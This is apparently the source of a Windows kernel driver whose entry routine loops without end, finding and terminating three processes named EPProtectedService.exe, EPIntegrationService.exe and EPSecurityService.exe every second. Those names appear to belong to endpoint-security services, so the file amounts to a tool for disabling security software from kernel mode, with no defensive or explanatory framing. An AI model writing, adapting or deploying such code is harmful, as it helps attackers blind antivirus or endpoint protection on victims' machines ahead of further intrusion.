#include "DriverUtilities.hpp"

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    HANDLE ProcessId;
    NTSTATUS status;

    while (TRUE) {
        status = FindProcessId(L"EPProtectedService.exe", &ProcessId); // <----
        if (NT_SUCCESS(status)) {
            status = TerminateProcess(ProcessId);
        }

        status = FindProcessId(L"EPIntegrationService.exe", &ProcessId);// <----
        if (NT_SUCCESS(status)) {
            status = TerminateProcess(ProcessId);
        }

        status = FindProcessId(L"EPSecurityService.exe", &ProcessId);// <----
        if (NT_SUCCESS(status)) {
            status = TerminateProcess(ProcessId);
        }

        LARGE_INTEGER interval;
        interval.QuadPart = -(10 * 1000 * 1000); // 1 second
        KeDelayExecutionThread(KernelMode, FALSE, &interval);
    }

    return STATUS_SUCCESS;
}
